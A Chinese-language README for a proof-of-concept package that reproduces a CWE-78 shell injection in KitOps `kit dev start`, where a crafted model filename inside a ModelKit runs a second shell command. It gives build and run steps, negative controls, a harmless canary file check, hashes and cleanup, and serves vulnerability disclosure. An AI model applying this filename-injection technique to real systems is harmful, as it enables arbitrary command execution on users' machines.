# poc/ — kitops.kitfile_model_path_shell_injection 复现包

漏洞:`kit dev start` 在 POSIX 分支把 ModelKit 内解析出的模型文件路径以 `%s` 拼进 shell 字符串,
经 `exec.Command("sh", "-c", ...)` 执行(`pkg/lib/harness/llm-harness.go:102`);路径的**文件名**
即攻击载荷。CWE-78,CVSS 3.1 `AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` = 7.8(High)。

- 被测产品:`kitops-ml/kitops`,钉定 commit `b6762849b23a599c834e5f14eda5cebcef40b640`
  (源码树摘要 `eee5ffd3...` 在容器内运行时自校验,与 `example/expected.json` 一致)
- 运行时网络:`--network none`;canary 只是写入一个标记文件,无持久化、无外联

## 目录内容

| 文件/目录 | 说明 |
|---|---|
| `Dockerfile` | 原始复现镜像(需可拉取 `golang:1.25-bookworm` 与 `mbe2e/base:py311`) |
| `Dockerfile.local` | 本机等价镜像(Debian 12 + Go 1.25.14 工具链 tarball + bookworm python3),功能一致,本次验证实际使用 |
| `prepare-context.sh` | 生成构建上下文:`dl/`(Go 1.25.14)、`src/`(钉定源码)、`vendor/`(go mod vendor) |
| `run_local.sh` | 本机协议脚本:build → 跑两遍 drive.py → cmp result.json →(保留镜像) |
| `example/build_artifact.py` | 确定性构造三个 ModelKit(evil / benign / nogguf),输出 SHA256 清单 |
| `example/expected.json` | canary 路径/内容、期望的源码树摘要等验收标准 |
| `exp/drive.py` | 以真实子进程驱动产品唯一入口 `kit dev start`,三个用例 + 负控判定 |
| `exp/treehash.py` | 源码树确定性摘要(容器内自校验用) |
| `exp/run.sh` | 原始协议脚本(build → run×2 → cmp → rmi) |
| `exp/result.json`、`exp/logs/` | 本次验证(2026-09-27/28)的批跑结果与逐用例日志 |
| `shot_scenario*.json`、`real_terminal_shot.ps1` | 真实终端截图驱动与三个截图场景 |
| `repro-run/` | 截图会话的工作目录:`out/`(canary 落地文件)+ 两份 harness.log 副本 |

## 一键复现(3 条命令)

```bash
bash prepare-context.sh                      # 1. 生成 dl/ src/ vendor/ 构建上下文
bash run_local.sh                            # 2. 构建镜像 + 双跑 drive.py + 确定性比对(退出码即结论)
docker run --rm -it --network none -v "$PWD/repro-run/out:/out" \
  mbe2e/v/kitops.kitfile_model_path_shell_injection:r1-w11 bash   # 3. 交互复现(见下)
```

第 3 步进入容器后逐条执行(一条一条来,别拼接):

```
kit version
python /work/example/build_artifact.py /artifact
find /artifact/evil_kit -mindepth 1
kit dev start /artifact/benign_kit --port 18081   # 负控A:正常启动
ls -la /out                                        # 负控A:/out 为空
kit dev stop
kit dev start /artifact/nogguf_kit --port 18082    # 负控B:找不到 .gguf,报错退出
kit dev start /artifact/evil_kit --port 18083      # 触发:报告 started 且退出码 0
cat /out/pwned_by_w11_kitops_kitfile               # → PWNED_BY_W11_KITOPS_KITFILE
cat /root/.local/share/kitops/harness/harness.log  # → sh: 1: x.gguf: not found
kit dev stop
exit
```

## 期望结果(与 2026-09-27/28 实测一致)

| 用例 | canary | 退出码 |
|---|---|---|
| N1 benign_kit(普通 `models/model.gguf`) | 无 | 0 |
| N2 nogguf_kit(无 .gguf) | 无 | 1(harness 构建前报错) |
| A1 evil_kit(载荷在文件名里) | `/out/pwned_by_w11_kitops_kitfile`,内容 `PWNED_BY_W11_KITOPS_KITFILE` | 0(产品仍报 "Development server started") |

两次批跑 `result.json` 逐字节一致;容器内源码树摘要自校验 = `eee5ffd3...`。

## 重新截图

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File poc\real_terminal_shot.ps1 -Scenario poc\shot_scenario.json  -OutDir screenshots
powershell -NoProfile -ExecutionPolicy Bypass -File poc\real_terminal_shot.ps1 -Scenario poc\shot_scenario2.json -OutDir screenshots
powershell -NoProfile -ExecutionPolicy Bypass -File poc\real_terminal_shot.ps1 -Scenario poc\shot_scenario3.json -OutDir screenshots
```

(先完成一键复现的第 1、2 步;scenario 里的镜像 tag 为 `r1-w11`,workingDir 按实际交付路径调整。)

## 样本哈希(SHA256,与报告一致)

```
SHA256SUMS            358e982801da47a3d02cce2fea1b2bcd4fe4854f7af7274317e6fe89db77813d
benign_kit/Kitfile    6d971837f2ee89042eb58b06466c97122f2065815204e1252bbecc52497d5b31
benign model.gguf     282aad56e1b088e1e1b7960672bd8cc14d511c92cff41a784eb1a0010b608944
evil_kit/Kitfile      5c237c108390d08b7972f7331a42e7eceb05352b742e2811b8fc9a4cafac3002
evil model file       282aad56e1b088e1e1b7960672bd8cc14d511c92cff41a784eb1a0010b608944(与 benign 逐字节相同)
nogguf_kit/Kitfile    1492e7eb9919941c360ecf5ea698526b7e76f39ae7a08f959dd8ff7761487ca3
```

## 清理

```bash
docker rmi mbe2e/v/kitops.kitfile_model_path_shell_injection:r1-w11
rm -rf dl src vendor goproxy modlist.txt example/artifact exp/out1 exp/out2
```

## 环境差异说明(诚实标注)

- 原始验证(2026-09-20)与本轮(2026-09-27/28)都在同一台 Windows 11 主机的 Docker Desktop 上完成;
  本轮因镜像站无法拉取 `golang:1.25-bookworm`,改用 **Go 1.25.14 官方工具链 tarball + Debian 12**
  等价构建(与原始记录的 `go1.25.14` 版本一致),其余协议逐字不变,两次批跑均 PASS 且确定性一致。
- 本轮 harness 仍由产品在构建期自行下载(`downloaded_by_product`);该 llamafile 二进制在运行期
  无日志输出即退出(与 9/20 时的行为不同,jozu.ml 所分发的构建可能已更新),不影响结论:
  canary 由 `/bin/sh` 的**第二条命令**写出,严格处于 kitops 拼接的字符串下游。
- Windows 侧注意:`>` 是 Win32 保留字符,`docker cp` 无法把 evil kit 拷到 NTFS;如需宿主机侧
  副本请经 WSL/POSIX 工具解包。
